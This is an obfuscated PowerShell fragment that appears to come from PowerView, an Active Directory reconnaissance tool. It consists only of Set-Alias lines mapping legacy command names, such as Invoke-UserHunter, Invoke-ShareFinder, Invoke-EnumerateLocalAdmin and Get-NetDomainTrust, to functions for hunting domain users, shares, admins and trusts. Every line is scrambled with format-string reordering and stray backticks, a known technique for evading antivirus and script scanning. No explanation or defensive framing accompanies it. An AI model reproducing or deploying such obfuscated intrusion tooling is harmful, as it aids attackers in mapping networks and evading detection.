&("{1}{0}{2}" -f 'li','Set-A','as') ("{4}{3}{1}{2}{0}"-f'ion','chedRDPConnec','t','Ca','Get-') ("{3}{2}{6}{0}{5}{4}{1}" -f 'o','on','RegCach','Get-WMI','ti','nnec','edRDPC')
&("{0}{2}{1}{3}" -f 'Set-','lia','A','s') ("{4}{1}{5}{6}{3}{0}{2}" -f'iv','t-Reg','e','edDr','Ge','istryMoun','t') ("{2}{4}{0}{1}{3}" -f 'ount','edDr','Get','ive','-WMIRegM')
&("{2}{1}{0}" -f's','t-Alia','Se') ("{2}{0}{1}"-f 't','-NetProcess','Ge') ("{1}{2}{0}" -f'ocess','Get-W','MIPr')
&("{0}{1}{2}"-f 'Set-A','li','as') ("{2}{5}{3}{0}{4}{1}" -f'rea','Function','In','Th','ded','voke-') N`Ew`-threAdEDF`Un`CTION
&("{0}{1}"-f'Set','-Alias') ("{1}{4}{2}{0}{3}"-f'nte','Invoke-','Hu','r','User') ("{6}{5}{2}{4}{3}{0}{1}"-f'nUserLo','cation','o','ai','m','-D','Find')
&("{0}{1}{2}"-f'Set-','Alia','s') ("{3}{0}{1}{2}{4}" -f 'ssH','un','t','Invoke-Proce','er') ("{4}{1}{2}{3}{0}" -f 'ocess','i','n','Pr','Find-Doma')
&("{1}{2}{0}"-f's','Set-Ali','a') ("{0}{2}{5}{3}{4}{1}"-f'Inv','unter','oke-','ent','H','Ev') ("{0}{1}{2}{3}{4}" -f 'F','ind-D','omainU','serEv','ent')
&("{2}{0}{1}" -f'lia','s','Set-A') ("{4}{0}{2}{1}{3}" -f 'voke-','e','ShareFind','r','In') ("{2}{0}{4}{3}{1}" -f'd-D','re','Fin','ha','omainS')
&("{2}{1}{0}"-f 'ias','-Al','Set') ("{0}{3}{2}{1}" -f 'Invoke-Fil','er','ind','eF') ("{9}{0}{7}{5}{1}{8}{4}{2}{6}{3}" -f 'ind-I','est','omainSh','e','gD','ter','areFil','n','in','F')
&("{0}{1}{2}" -f 'S','et-','Alias') ("{5}{3}{0}{8}{7}{2}{1}{4}{6}"-f 'nume','oca','L','-E','lA','Invoke','dmin','te','ra') ("{7}{0}{6}{3}{1}{5}{2}{4}" -f'd-Doma','a','e','nLoc','r','lGroupMemb','i','Fin')
&("{0}{3}{1}{2}"-f 'Set-Al','a','s','i') ("{3}{0}{1}{2}"-f'et','-NetDomainTru','st','G') ("{0}{4}{3}{2}{1}"-f 'Ge','ust','omainTr','-D','t')
&("{1}{2}{0}" -f 'Alias','Se','t-') ("{0}{1}{2}{3}{4}"-f 'Get-','NetFore','stT','rus','t') ("{1}{4}{2}{3}{0}" -f'ust','G','-','ForestTr','et')
&("{2}{0}{1}"-f'ia','s','Set-Al') ("{4}{3}{1}{2}{0}" -f 'er','re','ignUs','ind-Fo','F') ("{1}{2}{3}{0}"-f 'er','Ge','t-Domai','nForeignUs')
&("{1}{0}" -f'-Alias','Set') ("{1}{2}{0}{3}"-f'nd','F','i','-ForeignGroup') ("{3}{4}{1}{0}{6}{7}{5}{2}{8}"-f'inF','oma','upM','Get-','D','ro','ore','ignG','ember')
&("{1}{2}{0}" -f'lias','Set','-A') ("{1}{3}{2}{4}{0}"-f'Trust','I','Dom','nvoke-Map','ain') ("{0}{3}{4}{1}{2}{5}"-f'Ge','u','stMapp','t-D','omainTr','ing')
&("{1}{2}{0}"-f 'ias','S','et-Al') ("{3}{2}{0}{1}" -f 'mainPol','icy','t-Do','Ge') ("{2}{1}{0}{5}{3}{4}"-f'mainP','Do','Get-','y','Data','olic')


